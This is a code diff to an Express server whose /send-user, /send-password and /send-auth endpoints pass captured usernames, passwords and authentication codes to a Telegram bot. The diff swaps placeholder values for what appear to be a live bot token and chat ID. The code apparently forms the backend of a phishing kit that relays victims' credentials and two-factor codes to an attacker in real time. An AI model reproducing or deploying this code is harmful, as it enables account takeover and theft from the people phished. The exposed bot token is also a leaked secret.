@@ -30,10 +30,10 @@ app.post('/send-user', async (req, res) => {
     }
     usuariosData[dispositivoID].usuario = `UUUUU ${dispositivoID.replace('id.', '')}: \`${usuario}\``;
 
-    await fetch(`https://api.telegram.org/bottoken/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '0',
+            chat_id: '8660458713',
             text: usuariosData[dispositivoID].usuario,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
@@ -51,10 +51,10 @@ app.post('/send-password', async (req, res) => {
         usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', '')}: \`${password}\``;
     }
 
-    await fetch(`https://api.telegram.org/bottoken/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '0',
+            chat_id: '8660458713',
             text: usuariosData[dispositivoID].contraseña,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
@@ -72,10 +72,10 @@ app.post('/send-auth', async (req, res) => {
         usuariosData[dispositivoID].codigo = `AAAAA ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
     }
 
-    await fetch(`https://api.telegram.org/bottoken/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '0',
+            chat_id: '8660458713',
             text: usuariosData[dispositivoID].codigo,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
